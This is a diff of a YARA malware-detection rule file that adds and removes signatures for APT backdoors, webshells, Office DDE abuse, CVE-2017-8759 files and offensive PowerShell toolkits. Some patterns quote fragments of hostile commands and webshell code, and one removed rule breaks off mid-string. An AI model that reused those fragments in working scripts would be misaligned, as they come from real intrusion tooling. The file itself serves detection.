-      reference = "https://www.hvs-consulting.de/media/downloads/ThreatReport-Lazarus.pdf"
-      hash = "961a66d01c86fa5982e0538215b17fb9fae2991331dfea812b8c031e2ceb0d90"
-      id = "dc006b46-4c51-59cd-8b7d-adbfec86cd2e"
-   strings:
-      $g1 = "server.scripttimeout=600" fullword ascii
-      $g2 = "response.buffer=true" fullword ascii
-      $g3 = "response.expires=-1" fullword ascii
-      $g4 = "session.timeout=600" fullword ascii
-
-      $a1 = "redhat hacker" ascii
-      $a2 = "want_pre.asp" ascii
-      $a3 = "vgo=\"admin\"" ascii
-      $a4 = "ywc=false" ascii
-
-      $s1 = "public  br,ygv,gbc,ydo,yka,wzd,sod,vmd" fullword ascii
-   condition:
-      filesize > 70KB and filesize < 200KB and (( 1 of ($s*) ) or (2 of ($a*)) or (3 of ($g*)))
 }
 
 rule HvS_APT37_webshell_controllers_asp {
@@ -33407,195 +29104,6 @@ rule APT_Loader_Win32_DShell_3
         (uint16(0) == 0x5A4D) and (uint32(uint32(0x3C)) == 0x00004550) and (uint16(uint32(0x3C)+0x18) == 0x010B) and all of them
 }
 
-rule APT_Backdoor_Win_DShell_1
-{
-    meta:
-        description = "This rule is looking for sections of an integer array which contains the encoded payload along with a selection of Windows functions that are present within a DShell payload"
-        md5 = "152fc2320790aa16ef9b6126f47c3cca"
-        reference = "https://www.fireeye.com/blog/products-and-services/2020/12/fireeye-shares-details-of-recent-cyber-attack-actions-to-protect-community.html"
-        author = "FireEye"
-    strings:
-        $e0 = ",0,"
-        $e1 = ",1,"
-        $e2 = ",2,"
-        $e3 = ",3,"
-        $e4 = ",4,"
-        $e5 = ",5,"
-        $e6 = ",6,"
-        $e7 = ",7,"
-        $e8 = ",8,"
-        $e9 = ",9,"
-        $e10 = ",10,"
-        $e11 = ",11,"
-        $e12 = ",12,"
-        $e13 = ",13,"
-        $e14 = ",14,"
-        $e15 = ",15,"
-        $e16 = ",16,"
-        $e17 = ",17,"
-        $e18 = ",18,"
-        $e19 = ",19,"
-        $e20 = ",20,"
-        $e21 = ",21,"
-        $e22 = ",22,"
-        $e23 = ",23,"
-        $e24 = ",24,"
-        $e25 = ",25,"
-        $e26 = ",26,"
-        $e27 = ",27,"
-        $e28 = ",28,"
-        $e29 = ",29,"
-        $e30 = ",30,"
-        $e31 = ",31,"
-        $e32 = ",32,"
-        $e33 = ",33,"
-        $e34 = ",34,"
-        $e35 = ",35,"
-        $e36 = ",36,"
-        $e37 = ",37,"
-        $e38 = ",38,"
-        $e39 = ",39,"
-        $e40 = ",40,"
-        $e41 = ",41,"
-        $e42 = ",42,"
-        $e43 = ",43,"
-        $e44 = ",44,"
-        $e45 = ",45,"
-        $e46 = ",46,"
-        $e47 = ",47,"
-        $e48 = ",48,"
-        $e49 = ",49,"
-        $e50 = ",50,"
-        $e51 = ",51,"
-        $e52 = ",52,"
-        $e53 = ",53,"
-        $e54 = ",54,"
-        $e55 = ",55,"
-        $e56 = ",56,"
-        $e57 = ",57,"
-        $e58 = ",58,"
-        $e59 = ",59,"
-        $e60 = ",60,"
-        $e61 = ",61,"
-        $e62 = ",62,"
-        $e63 = ",63,"
-        $e64 = ",64,"
-        $s1 = "GetACP"
-        $s2 = "GetOEMCP"
-        $s3 = "GetCPInfo"
-        $s4 = "WriteConsoleA"
-        $s5 = "FindFirstFileA"
-        $s6 = "FileTimeToDosDateTime"
-        $s7 = "FindNextFileA"
-        $s8 = "GetStringTypeA"
-        $s9 = "GetFileType"
-        $s10 = "CreateFileA"
-        $s11 = "GlobalAlloc"
-        $s12 = "GlobalFree"
-        $s13 = "GetTickCount"
-        $s14 = "GetProcessHeap"
-        $s15 = "UnhandledExceptionFilter"
-        $s16 = "ExitProcess"
-        $s17 = "GetModuleFileNameA"
-        $s18 = "LCMapStringA"
-        $s19 = "GetLocalTime"
-        $s20 = "CreateThread"
-        $s21 = "ExitThread"
-        $s22 = "SetConsoleCtrlHandler"
-        $s23 = "FreeEnvironmentStringsA"
-        $s24 = "GetVersion"
-        $s25 = "GetEnvironmentStrings"
-        $s26 = "SetHandleCount"
-        $s27 = "SetFilePointer"
-        $s28 = "DeleteFileA"
-        $s29 = "HeapAlloc"
-        $s30 = "HeapReAlloc"
-        $s31 = "HeapFree"
-        $s32 = "GetCommandLineA"
-        $s33 = "GetThreadContext"
-        $s34 = "SuspendThread"
-        $s35 = "FindFirstFileW"
-        $s36 = "FindNextFileW"
-        $s37 = "FindClose"
-        $s38 = "CreateSemaphoreA"
-        $s39 = "ReleaseSemaphore"
-        $s40 = "ExpandEnvironmentStringsW"
-        $s41 = "lstrlenW"
-        $s42 = "GetModuleHandleA"
-        $s43 = "GetEnvironmentVariableA"
-        $s44 = "RtlCaptureContext"
-        $s45 = "GlobalMemoryStatus"
-        $s46 = "VirtualAlloc"
-        $s47 = "Sleep"
-        $s48 = "SystemTimeToTzSpecificLocalTime"
-        $s49 = "TzSpecificLocalTimeToSystemTime"
-        $s50 = "GetTimeZoneInformation"
-        $s51 = "TryEnterCriticalSection"
-        $s52 = "LoadLibraryA"
-        $s53 = "VirtualFree"
-        $s54 = "GetExitCodeThread"
-        $s55 = "WaitForSingleObject"
-        $s56 = "ResumeThread"
-        $s57 = "DuplicateHandle"
-        $s58 = "GetCurrentProcess"
-        $s59 = "GetCurrentThread"
-        $s60 = "GetCurrentThreadId"
-        $s61 = "InitializeCriticalSection"
-        $s62 = "DeleteCriticalSection"
-        $s63 = "SwitchToThread"
-        $s64 = "LeaveCriticalSection"
-        $s65 = "EnterCriticalSection"
-        $s66 = "FormatMessageW"
-        $s67 = "SetLastError"
-        $s68 = "GetEnvironmentVariableW"
-        $s69 = "FreeEnvironmentStringsW"
-        $s70 = "GetEnvironmentStringsW"
-        $s71 = "SetEnvironmentVariableW"
-        $s72 = "GetSystemInfo"
-        $s73 = "QueryPerformanceFrequency"
-        $s74 = "QueryPerformanceCounter"
-        $s75 = "CreateProcessW"
-        $s76 = "GetStdHandle"
-        $s77 = "GetHandleInformation"
-        $s78 = "SetHandleInformation"
-        $s79 = "WriteFile"
-        $s80 = "GetConsoleOutputCP"
-        $s81 = "FreeLibrary"
-        $s82 = "GetConsoleScreenBufferInfo"
-        $s83 = "MultiByteToWideChar"
-        $s84 = "RaiseException"
-        $s85 = "RtlUnwind"
-        $s86 = "GetCurrentDirectoryW"
-        $s87 = "IsDebuggerPresent"
-        $s88 = "LocalFree"
-        $s89 = "WideCharToMultiByte"
-        $s90 = "GetCommandLineW"
-        $s91 = "ReadFile"
-        $s92 = "GetFileSize"
-        $s93 = "CloseHandle"
-        $s94 = "CreateFileW"
-        $s95 = "LoadLibraryW"
-        $s96 = "GetProcAddress"
-        $s97 = "GetFileAttributesW"
-        $s98 = "GetLastError"
-        $s99 = "CommandLineToArgvW"
-        $s100 = "MessageBoxA"
-        $s101 = "RegEnumValueW"
-        $s102 = "RegEnumKeyExW"
-        $s103 = "RegDeleteValueW"
-        $s104 = "RegFlushKey"
-        $s105 = "RegQueryInfoKeyW"
-        $s106 = "RegDeleteKeyW"
-        $s107 = "RegQueryValueExW"
-        $s108 = "RegSetValueExW"
-        $s109 = "RegOpenKeyW"
-        $s110 = "RegOpenKeyExW"
-        $s111 = "RegCreateKeyExW"
-        $s112 = "RegCloseKey"
-    condition:
-        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and filesize > 500KB and 105 of ($s*) and $s112 in (3000..4000) and 40 of ($e*)
-}
-
 rule APT_Loader_Win32_DShell_1
 {
     meta:
@@ -33661,136 +29169,6 @@ rule HackTool_PY_ImpacketObfuscation_1
         all of them
 }
 
-rule APT_Backdoor_Win_DShell_2
-{
-    meta:
-        description = "This rule looks for strings specific to the D programming language in combination with a selection of Windows functions that are present within a DShell payload"
-        md5 = "e0683f8ee787313cfd2c61cd0995a830"
-        reference = "https://www.fireeye.com/blog/products-and-services/2020/12/fireeye-shares-details-of-recent-cyber-attack-actions-to-protect-community.html"
-        author = "FireEye"
-    strings:
-        $dlang1 = "C:\\D\\dmd2\\windows\\bin\\..\\..\\src\\phobos\\std\\utf.d" ascii wide
-        $dlang2 = "C:\\D\\dmd2\\windows\\bin\\..\\..\\src\\phobos\\std\\file.d" ascii wide
-        $dlang3 = "C:\\D\\dmd2\\windows\\bin\\..\\..\\src\\phobos\\std\\format.d" ascii wide
-        $dlang4 = "C:\\D\\dmd2\\windows\\bin\\..\\..\\src\\phobos\\std\\base64.d" ascii wide
-        $dlang5 = "C:\\D\\dmd2\\windows\\bin\\..\\..\\src\\phobos\\std\\stdio.d" ascii wide
-        $dlang6 = "\\..\\..\\src\\phobos\\std\\utf.d" ascii wide
-        $dlang7 = "\\..\\..\\src\\phobos\\std\\file.d" ascii wide
-        $dlang8 = "\\..\\..\\src\\phobos\\std\\format.d" ascii wide
-        $dlang9 = "\\..\\..\\src\\phobos\\std\\base64.d" ascii wide
-        $dlang10 = "\\..\\..\\src\\phobos\\std\\stdio.d" ascii wide
-        $dlang11 = "Unexpected '\\n' when converting from type const(char)[] to type int" ascii wide
-        $ign1 = "--strip-comments"
-        $ign2 = "Usage: rdmd [RDMD AND DMD OPTIONS]"
-        $s1 = "CloseHandle"
-        $s2 = "CommandLineToArgvW"
-        $s3 = "CreateFileA"
-        $s4 = "CreateSemaphoreA"
-        $s5 = "CreateThread"
-        $s6 = "DeleteCriticalSection"
-        $s7 = "DeleteFileA"
-        $s8 = "DuplicateHandle"
-        $s9 = "EnterCriticalSection"
-        $s10 = "ExitProcess"
-        $s11 = "ExitThread"
-        $s12 = "ExpandEnvironmentStringsW"
-        $s13 = "FileTimeToDosDateTime"
-        $s14 = "FindClose"
-        $s15 = "FindFirstFileA"
-        $s16 = "FindFirstFileW"
-        $s17 = "FindNextFileA"
-        $s18 = "FindNextFileW"
-        $s19 = "FormatMessageW"
-        $s20 = "FreeEnvironmentStringsA"
-        $s21 = "FreeEnvironmentStringsW"
-        $s22 = "FreeLibrary"
-        $s23 = "GetACP"
-        $s24 = "GetCPInfo"
-        $s25 = "GetCommandLineA"
-        $s26 = "GetCommandLineW"
-        $s27 = "GetConsoleOutputCP"
-        $s28 = "GetConsoleScreenBufferInfo"
-        $s29 = "GetCurrentProcess"
-        $s30 = "GetCurrentThread"
-        $s31 = "GetCurrentThreadId"
-        $s32 = "GetEnvironmentStrings"
-        $s33 = "GetEnvironmentStringsW"
-        $s34 = "GetEnvironmentVariableA"
-        $s35 = "GetEnvironmentVariableW"
-        $s36 = "GetExitCodeThread"
-        $s37 = "GetFileAttributesW"
-        $s38 = "GetFileType"
-        $s39 = "GetLastError"
-        $s40 = "GetModuleFileNameA"
-        $s41 = "GetModuleHandleA"
-        $s42 = "GetOEMCP"
-        $s43 = "GetProcAddress"
-        $s44 = "GetProcessHeap"
-        $s45 = "GetStdHandle"
-        $s46 = "GetStringTypeA"
-        $s47 = "GetSystemInfo"
-        $s48 = "GetThreadContext"
-        $s49 = "GetTickCount"
-        $s50 = "GetTimeZoneInformation"
-        $s51 = "GetVersion"
-        $s52 = "GlobalAlloc"
-        $s53 = "GlobalFree"
-        $s54 = "GlobalMemoryStatus"
-        $s55 = "HeapAlloc"
-        $s56 = "HeapFree"
-        $s57 = "HeapReAlloc"
-        $s58 = "InitializeCriticalSection"
-        $s59 = "IsDebuggerPresent"
-        $s60 = "LCMapStringA"
-        $s61 = "LeaveCriticalSection"
-        $s62 = "LoadLibraryA"
-        $s63 = "LoadLibraryW"
-        $s64 = "LocalFree"
-        $s65 = "MessageBoxA"
-        $s66 = "MultiByteToWideChar"
-        $s67 = "QueryPerformanceCounter"
-        $s68 = "QueryPerformanceFrequency"
-        $s69 = "RaiseException"
-        $s70 = "ReadFile"
-        $s71 = "RegCloseKey"
-        $s72 = "RegCreateKeyExW"
-        $s73 = "RegDeleteKeyW"
-        $s74 = "RegDeleteValueW"
-        $s75 = "RegEnumKeyExW"
-        $s76 = "RegEnumValueW"
-        $s77 = "RegFlushKey"
-        $s78 = "RegOpenKeyExW"
-        $s79 = "RegOpenKeyW"
-        $s80 = "RegQueryInfoKeyW"
-        $s81 = "RegQueryValueExW"
-        $s82 = "RegSetValueExW"
-        $s83 = "ReleaseSemaphore"
-        $s84 = "ResumeThread"
-        $s85 = "RtlCaptureContext"
-        $s86 = "RtlUnwind"
-        $s87 = "SetConsoleCtrlHandler"
-        $s88 = "SetEnvironmentVariableW"
-        $s89 = "SetFilePointer"
-        $s90 = "SetHandleCount"
-        $s91 = "SetLastError"
-        $s92 = "Sleep"
-        $s93 = "SuspendThread"
-        $s94 = "SwitchToThread"
-        $s95 = "SystemTimeToTzSpecificLocalTime"
-        $s96 = "TryEnterCriticalSection"
-        $s97 = "TzSpecificLocalTimeToSystemTime"
-        $s98 = "UnhandledExceptionFilter"
-        $s99 = "VirtualAlloc"
-        $s100 = "VirtualFree"
-        $s101 = "WaitForSingleObject"
-        $s102 = "WideCharToMultiByte"
-        $s103 = "WriteConsoleA"
-        $s104 = "WriteFile"
-        $s105 = "lstrlenW"
-    condition:
-        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and filesize > 500KB and filesize > 700KB and all of ($s*) and 1 of ($dlang*) and not $ign1 and not $ign2
-}
-
 rule HackTool_Win64_AndrewSpecial_1
 {
     meta:
@@ -33807,26 +29185,6 @@ rule HackTool_Win64_AndrewSpecial_1
         $shellcode_x64_inline = { C6 44 24 ?? 4C C6 44 24 ?? 8B C6 44 24 ?? D1 C6 44 24 ?? B8 C6 44 24 ?? 3C C6 44 24 ?? 00 C6 44 24 ?? 00 C6 44 24 ?? 00 C6 44 24 ?? 0F C6 44 24 ?? 05 C6 44 24 ?? C3 }
     condition:
         (uint16(0) == 0x5A4D) and (uint32(uint32(0x3C)) == 0x00004550) and (uint16(uint32(0x3C)+0x18) == 0x020B) and $dump and any of ($shellcode*)
-}
-
-rule Trojan_Macro_RESUMEPLEASE_1
-{
-    meta:
-        description = "Detects FireEye's macro RESUMEPLEASE"
-        date = "2020-12-01"
-        modified = "2020-12-01"
-        md5 = "d5d3d23c8573d999f1c48d3e211b1066"
-        reference = "https://www.fireeye.com/blog/products-and-services/2020/12/fireeye-shares-details-of-recent-cyber-attack-actions-to-protect-community.html"
-        author = "FireEye"
-    strings:
-        $str00 = "For Binary As"
-        $str01 = "Range.Text"
-        $str02 = "Environ("
-        $str03 = "CByte("
-        $str04 = ".SpawnInstance_"
-        $str05 = ".Create("
-    condition:
-        all of them
 }
 
 rule APT_Builder_PY_REDFLARE_1
@@ -34142,65 +29500,6 @@ rule APT28_SourFace_Malware2 {
 		uint16(0) == 0x5a4d and filesize < 550KB and all of them
 }
 
-rule APT28_SourFace_Malware3 {
-	meta:
-		description = "Detects Malware from APT28 incident - SOURFACE is a downloader that obtains a second-stage backdoor from a C2 server."
-		author = "Florian Roth (Nextron Systems)"
-		reference = "https://www.fireeye.com/blog/threat-research/2014/10/apt28-a-window-into-russias-cyber-espionage-operations.html"
-		date = "2015-06-01"
-		super_rule = 1
-		hash0 = "85522190958c82589fa290c0835805f3d9a2f8d6"
-		hash1 = "d9c53adce8c35ec3b1e015ec8011078902e6800b"
-		hash2 = "367d40465fd1633c435b966fa9b289188aa444bc"
-		hash3 = "d87b310aa81ae6254fff27b7d57f76035f544073"
-		hash4 = "cf3220c867b81949d1ce2b36446642de7894c6dc"
-		hash5 = "ed48ef531d96e8c7360701da1c57e2ff13f12405"
-		hash6 = "682e49efa6d2549147a21993d64291bfa40d815a"
-		hash7 = "a8551397e1f1a2c0148e6eadcb56fa35ee6009ca"
-		hash8 = "f5b3e98c6b5d65807da66d50bd5730d35692174d"
-		hash9 = "e2450dffa675c61aa43077b25b12851a910eeeb6"
-		score = 60
-		id = "b49843b9-3a54-5525-958e-ac545cc00bde"
-	strings:
-		$s0 = "coreshell.dll" fullword wide /* PEStudio Blacklist: strings */
-		$s1 = "Core Shell Runtime Service" fullword wide /* PEStudio Blacklist: strings */
-	condition:
-		uint16(0) == 0x5a4d and filesize < 550KB and all of them
-}
-
-rule APT28_SkinnyBoy_Dropper: RUSSIA {
-   meta:
-      description = "Detects APT28 SkinnyBoy droppers"
-      author = "Cluster25"
-      date = "2021-05-24"
-      reference = "https://cluster25.io/wp-content/uploads/2021/05/2021-05_FancyBear.pdf"
-      hash1 = "12331809c3e03d84498f428a37a28cf6cbb1dafe98c36463593ad12898c588c9"
-      id = "ed0b2d2b-f820-57b5-9654-c24734d81996"
-   strings:
-      $ = "cmd /c DEL " ascii
-      /* $ = " \"" ascii */ /* slowing down scanning */
-      $ = {8a 08 40 84 c9 75 f9}
-      $ = {0f b7 84 0d fc fe ff ff 66 31 84 0d fc fd ff ff}
-   condition:
-      (uint16(0) == 0x5A4D and all of them)
-}
-
-rule Line_Dancer {
-   meta:
-      author = "NCSC"
-      description = "Targets code sections of Line Dancer, a shellcode loader targeting Cisco ASA devices."
-      reference = "https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/line/ncsc-tip-line-dancer.pdf"
-      date = "2024-04-24"
-      score = 75
-      id = "3b49a861-8107-577a-bae1-ae28d424cc13"
-   strings:
-      $ = { 48 8D 5E 20 48 8D 3D BB FF FF FF BA 20 00 00 00 }
-      $ = { 4C 89 EE 44 89 F2 48 8D 3D 9A 27 00 00 }
-      $ = { 41 FF D7 41 5F 41 5E 41 5D 41 5C 5B 5D 48 C7 C0 01 00 00 00 5F }
-   condition:
-      all of them
-}
-
 rule Office_DDEAUTO_field {
    meta:
       description = "Detects DDE in MS Office documents"
@@ -34210,19 +29509,6 @@ rule Office_DDEAUTO_field {
       score = 60
    strings:
       $a = /<w:fldChar\s+?w:fldCharType="begin"\/>.{1,1000}?\b[Dd][Dd][Ee][Aa][Uu][Tt][Oo]\b.{1,1000}?<w:fldChar\s+?w:fldCharType="end"\/>/
-   condition:
-      $a
-}
-
-rule Office_DDE_field {
-   meta:
-      description = "Detects DDE in MS Office documents"
-      author = "NVISO Labs"
-      reference = "https://blog.nviso.be/2017/10/11/detecting-dde-in-ms-office-documents/"
-      date = "2017-10-12"
-      score = 40
-   strings:
-      $a = /<w:fldChar\s+?w:fldCharType="begin"\/>.+?\b[Dd][Dd][Ee]\b.+?<w:fldChar\s+?w:fldCharType="end"\/>/
    condition:
       $a
 }
@@ -34344,6 +29630,37 @@ rule malware_sakula_shellcode {
 
   condition:
     any of them
+}
+
+rule CVE_2017_8759_Mal_HTA {
+   meta:
+      description = "Detects malicious files related to CVE-2017-8759 - file cmd.hta"
+      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
+      author = "Florian Roth (Nextron Systems)"
+      reference = "https://github.com/Voulnet/CVE-2017-8759-Exploit-sample"
+      date = "2017-09-14"
+      hash1 = "fee2ab286eb542c08fdfef29fabf7796a0a91083a0ee29ebae219168528294b5"
+      id = "e53b5149-fc94-5da5-8e35-7f09a9cd79fd"
+   strings:
+      $x1 = "Error = Process.Create(\"powershell -nop cmd.exe /c" fullword ascii
+   condition:
+      ( uint16(0) == 0x683c and filesize < 1KB and all of them )
+}
+
+rule CVE_2017_8759_SOAP_via_JS {
+   meta:
+      description = "Detects SOAP WDSL Download via JavaScript"
+      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
+      author = "Florian Roth (Nextron Systems)"
+      reference = "https://twitter.com/buffaloverflow/status/907728364278087680"
+      date = "2017-09-14"
+      score = 60
+      id = "9e96cea3-4282-5f25-ad37-51bd69258790"
+   strings:
+      $s1 = "GetObject(\"soap:wsdl=https://" ascii wide nocase
+      $s2 = "GetObject(\"soap:wsdl=http://" ascii wide nocase
+   condition:
+      ( filesize < 3KB and 1 of them )
 }
 
 rule Empire_ReflectivePick_x64_orig {
@@ -34529,6 +29846,27 @@ rule ps1_toolkit_Invoke_Mimikatz_RelfectivePEInjection {
 		$s11 = "[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])" fullword ascii
 	condition:
 		( uint16(0) == 0xbbef and filesize < 10000KB and 3 of them ) or ( 6 of them )
+}
+
+rule ps1_toolkit_PowerUp_2 {
+	meta:
+		description = "Auto-generated rule - from files PowerUp.ps1"
+		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
+		author = "Florian Roth (Nextron Systems)"
+		reference = "https://github.com/vysec/ps1-toolkit"
+		date = "2016-09-04"
+		score = 80
+		hash1 = "fc65ec85dbcd49001e6037de9134086dd5559ac41ac4d1adf7cab319546758ad"
+		id = "11322a66-67d4-574b-acef-35d06e6f95f4"
+	strings:
+		$s1 = "if($MyConString -like $([Text.Encoding]::Unicode.GetString([Convert]::" ascii
+		$s2 = "FromBase64String('KgBwAGEAcwBzAHcAbwByAGQAKgA=')))) {" ascii
+		$s3 = "$Null = Invoke-ServiceStart" ascii
+		$s4 = "Write-Warning \"[!] Access to service $" ascii
+		$s5 = "} = $MyConString.Split(\"=\")[1].Split(\";\")[0]" ascii
+		$s6 = "} += \"net localgroup ${" ascii
+	condition:
+		( uint16(0) == 0xbbef and filesize < 2000KB and 2 of them ) or ( 4 of them )
 }
 
 rule ps1_toolkit_Persistence_2 {
@@ -34953,6 +30291,29 @@ rule APT_MAL_CN_Wocao_agent_powershell_b64encoded {
         all of them
 }
 
+rule APT_MAL_CN_Wocao_agent_py {
+    meta:
+        description = "Strings from Python version of Agent"
+        author = "Fox-IT SRT"
+        reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
+
+        id = "ca30dd6a-b596-54ab-b4f0-50e6b1382f73"
+    strings:
+        $a = "vpshex.decode"
+        $b = "self._newsock.recv"
+        $c = "Rsock.connect"
+        $d = /MAX_DATALEN\s?=\s?10240/
+        $e = /LISTEN_MAXCOUNT\s?=\s?80/
+        $f = "ListenSock.listen(LISTEN_MAXCOUNT)"
+        $g = "nextsock.send(head)"
+        $h = "elif transnode"
+        $i = "infobuf[4:6]"
+
+        $key = "L\\x1bh\\x0bj\\x18\\tAZ6\\x1fV&*\\x03D}_\\x03{\\x07n\\x03w0pRBSg\\n*"
+    condition:
+        1 of them
+}
+
 rule APT_MAL_CN_Wocao_agent_py_b64encoded {
     meta:
         description = "Piece of Base64 encoded data from Agent Python version"
@@ -35080,79 +30441,6 @@ rule APT_MAL_CN_Wocao_getos_py {
         (all of ($tsk_*)) or
         (3 of ($str_*))
 }
-
-rule APT_MAL_CN_Wocao_info_vbs {
-    meta:
-        description = "Strings from the information grabber VBS"
-        author = "Fox-IT SRT"
-        reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
-
-        id = "b719fb31-2836-5faf-a7c8-c361a14df2be"
-    strings:
-        $ = "Logger PingConnect"
-        $ = "Logger GetAdmins"
-        $ = "Logger InstallPro"
-        $ = "Logger Exec"
-        $ = "retstr = adminsName & \" Members\" & vbCrLf & _"
-        $ = "Logger VolumeName & \" (\" & objDrive.DriveLetter & \":)\" _"
-        $ = "txtRes = txtRes & machine & \" can"
-        $ = "retstr = \"PID   SID Image Name\" & vbCrLf & \"===="
-
-    condition:
-        4 of them
-}
-
-rule APT_MAL_CN_Wocao_webshell_console_jsp {
-    meta:
-        description = "Strings from the console.jsp webshell"
-        author = "Fox-IT SRT"
-        reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
-
-        id = "1afdfc34-d2e3-58c7-80ea-ee5632e42469"
-    strings:
-        $a = "String strLogo = request.getParameter(\"image\")"
-        $b = "!strLogo.equals(\"web.gif\")"
-        $c = "<font color=red>Save Failed!</font>"
-        $d = "<font color=red>Save Success!</font>"
-        $e = "Save path:<br><input type=text"
-        $f = "if (newfile.exists() && newfile.length()>0) { out.println"
-
-    condition:
-        1 of them
-}
-
-rule APT_MAL_CN_Wocao_webshell_index_jsp {
-    meta:
-        description = "Strings from the index.jsp socket tunnel"
-        author = "Fox-IT SRT"
-        reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
-
-        id = "9c226ccd-6c69-523c-bca4-371e55274667"
-    strings:
-        $x1 = "X-CMD"
-        $x2 = "X-STATUS"
-        $x3 = "X-TARGET"
-        $x4 = "X-ERROR"
-        $a = "out.print(\"All seems fine.\");"
-
-    condition:
-        all of ($x*) and $a
-}
-
-rule APT_MAL_CN_Wocao_webshell_ver_jsp {
-    meta:
-        description = "Strings from the ver.jsp webshell"
-        author = "Fox-IT SRT"
-        reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
-
-        id = "b2828b84-8934-5111-9345-683a07025070"
-    strings:
-        $a = "String strLogo = request.getParameter(\"id\")"
-        $b = "!strLogo.equals(\"256\")"
-        $c = "boolean chkos = msg.startsWith"
-        $d = "while((c = er.read()) != -1)"
-        $e = "out.print((char)c);}in.close()"
-        $f = "out.print((char)c);}
 
 rule APT_MAL_CN_Wocao_webshell_index_jsp {
     meta:
@@ -35353,30 +30641,6 @@ rule APT_Sandworm_CyclopsBlink_core_command_check {
       (uint32(0) == 0x464c457f) and (#cmd_check == 5)
 }
 
-rule APT_Sandworm_CyclopsBlink_handle_mod_0xf_command {
-   meta:
-      author = "NCSC"
-      description = "Detects the code bytes used to check module ID 0xf control flags and a format string used for file content upload"
-      hash1 = "3adf9a59743bc5d8399f67cab5eb2daf28b9b863"
-      hash2 = "c59bc17659daca1b1ce65b6af077f86a648ad8a8"
-      reference = "https://www.ncsc.gov.uk/news/joint-advisory-shows-new-sandworm-malware-cyclops-blink-replaces-vpnfilter"
-      date = "2022-02-23"
-      id = "36646b7a-389d-5fd9-88a1-e43e7224763a"
-   strings:
-      // Tests execute flag (bit 0)
-      $ = {54 00 06 3E 54 00 07 FE 54 00 06 3E 2F 80 00 00}
-      // Tests add module flag (bit 1)
-      $ = {54 00 06 3E 54 00 07 BC 2F 80 00 00}
-      // Tests run as shellcode flag (bit 2)
-      $ = {54 00 06 3E 54 00 07 7A 2F 80 00 00}
-      // Tests upload flag (bit 4)
-      $ = {54 00 06 3E 54 00 06 F6 2F 80 00 00}
-      // Upload format string
-      $ = "file:%s\n" fullword
-   condition:
-      (uint32(0) == 0x464c457f) and (all of them)
-}
-
 rule APT_Sandworm_CyclopsBlink_handle_mod_0x51_command {
    meta:
       author = "NCSC"
@@ -35461,57 +30725,6 @@ rule APT15_Malware_Mar18_RoyalCli {
       uint16(0) == 0x5a4d and filesize < 200KB and 2 of them
 }
 
-rule clean_apt15_patchedcmd{
-   meta:
-      author = "Ahmed Zaki"
-      description = "This is a patched CMD. This is the CMD that RoyalCli uses."
-      sha256 = "90d1f65cfa51da07e040e066d4409dc8a48c1ab451542c894a623bc75c14bf8f"
-      id = "c6867ad4-f7f2-5d63-bffd-07599ede635d"
-   strings:
-      $ = "eisableCMD" wide
-      $ = "%WINDOWS_COPYRIGHT%" wide
-      $ = "Cmd.Exe" wide
-      $ = "Windows Command Processor" wide
-   condition:
-      uint16(0) == 0x5A4D and all of them
-}
-
-rule malware_apt15_royalcli_1{
-   meta:
-      description = "Generic strings found in the Royal CLI tool"
-      author = "David Cannings"
-      sha256 = "6df9b712ff56009810c4000a0ad47e41b7a6183b69416251e060b5c80cd05785"
-      id = "432c09bf-3c44-5a2c-ba69-7b4fe7eb43cc"
-   strings:
-      $ = "%s~clitemp%08x.tmp" fullword
-      $ = "%s /c %s>%s" fullword
-      $ = "%snewcmd.exe" fullword
-      $ = "%shkcmd.exe" fullword
-      $ = "%s~clitemp%08x.ini" fullword
-      $ = "myRObject" fullword
-      $ = "myWObject" fullword
-      $ = "2 %s  %d 0 %d\x0D\x0A"
-      $ = "2 %s  %d 1 %d\x0D\x0A"
-      $ = "%s file not exist" fullword
-   condition:
-      uint16(0) == 0x5A4D and 5 of them
-}
-
-rule malware_apt15_royalcli_2{
-   meta:
-      author = "Nikolaos Pantazopoulos"
-      description = "APT15 RoyalCli backdoor"
-      id = "d4acfd2d-385d-5063-898e-d339b50733eb"
-   strings:
-      $string1 = "%shkcmd.exe" fullword
-      $string2 = "myRObject" fullword
-      $string3 = "%snewcmd.exe" fullword
-      $string4 = "%s~clitemp%08x.tmp" fullword
-      $string6 = "myWObject" fullword
-   condition:
-      uint16(0) == 0x5A4D and 2 of them
-}
-
 rule MAL_APT_Operation_ShadowHammer_MalSetup {
    meta:
       description = "Detects a malicious file used by BARIUM group in Operation ShadowHammer"
@@ -35532,194 +30745,6 @@ rule MAL_APT_Operation_ShadowHammer_MalSetup {
       $x2 = "\\AsusShellCode\\Debug"
    condition:
       uint16(0) == 0x5a4d and 1 of them
-}
-
-rule CobaltStrike_Resources_Bypassuactoken_Dll_v3_11_to_v3_14
-{
-	meta:
-		description = "Cobalt Strike's resources/bypassuactoken.dll from v3.11 to v3.14 (32-bit version)"
-		hash =  "df1c7256dfd78506e38c64c54c0645b6a56fc56b2ffad8c553b0f770c5683070"
-		author = "gssincla@google.com"
-		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
-		date = "2022-11-18"
-		
-		id = "b9f25fa5-bd1d-5ba0-9b1d-bb97e1dbf76b"
-	strings:
-	/*
-		5?                 push    eax; ReturnLength
-		5?                 push    edi; TokenInformationLength
-		5?                 push    edi; TokenInformation
-		8B ??              mov     ebx, ecx
-		6A 19              push    19h; TokenInformationClass
-		5?                 push    ebx; TokenHandle
-		FF 15 [4]          call    ds:GetTokenInformation
-		85 C0              test    eax, eax
-		75 ??              jnz     short loc_10001100
